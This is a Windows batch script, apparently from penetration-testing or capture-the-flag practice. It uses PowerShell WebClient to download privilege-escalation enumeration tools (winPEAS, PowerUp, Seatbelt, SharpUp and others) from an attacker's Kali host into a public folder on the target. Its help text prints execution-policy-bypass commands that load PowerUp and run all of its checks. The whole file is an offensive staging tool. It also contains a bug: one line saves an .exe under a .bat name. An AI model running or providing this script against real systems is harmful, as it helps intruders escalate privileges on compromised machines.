rmdir C:\Users\Public\script
mkdir C:\Users\Public\script
if "%1"== "" goto ERROR1
if "%1"== "help" goto HELPTXT
if "%2"== "" goto ERROR2

del C:\Users\Public\script\accesschk.exe
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/accesschk.exe','C:\Users\Public\script\accesschk.exe')"

del C:\Users\Public\script\accesschk64.exe
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/accesschk64.exe','C:\Users\Public\script\accesschk64.exe')"

del C:\Users\Public\script\jaws-enum.ps1
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/jaws-enum.ps1','C:\Users\Public\script\jaws-enum.ps1')"

del C:\Users\Public\script\Powerless.bat
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/Powerless.bat','C:\Users\Public\script\Powerless.bat')"

del C:\Users\Public\script\PowerUp.ps1
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/PowerUp.ps1','C:\Users\Public\script\PowerUp.ps1')"

del C:\Users\Public\script\Seatbelt.exe
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/Seatbelt.exe','C:\Users\Public\script\Seatbelt.exe')"

del C:\Users\Public\script\SharpUp.exe
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/SharpUp.exe','C:\Users\Public\script\SharpUp.exe')"

del C:\Users\Public\script\windows-privesc-check2.exe
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/windows-privesc-check2.exe','C:\Users\Public\script\windows-privesc-check2.exe')"

del C:\Users\Public\script\winPEASany.exe
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/winPEASany.exe','C:\Users\Public\script\winPEASany.exe')"

del C:\Users\Public\script\winPEASx64.exe
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/winPEASx64.exe','C:\Users\Public\script\winPEASx64.exe')"

del C:\Users\Public\script\winPEASx86.exe
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/winPEASx86.exe','C:\Users\Public\script\winPEASx86.exe')"

del C:\Users\Public\script\winPEAS.bat
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/winPEASx86.exe','C:\Users\Public\script\winPEAS.bat')"

exit /B

:ERROR1
echo kali IP shitei nashi
exit /B

:ERROR2
echo jikko option shitei nashi
echo 0:Executables Download
echo 1:jaws-enum
echo 2:Powerless
echo 3:PowerUp
echo 4:Seatbelt
echo 5:SharpUp
echo 6:windows-privesc-check2
echo 7:winPEASany
echo 8:winPEASx64
echo 9:winPEASx86
echo 10:winPEAS.bat
exit /B

:HELPTXT
echo "powershell -ep bypass"
echo ". .\PowerUp.ps1"
echo "Invoke-AllChecks"
echo powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"

exit /B
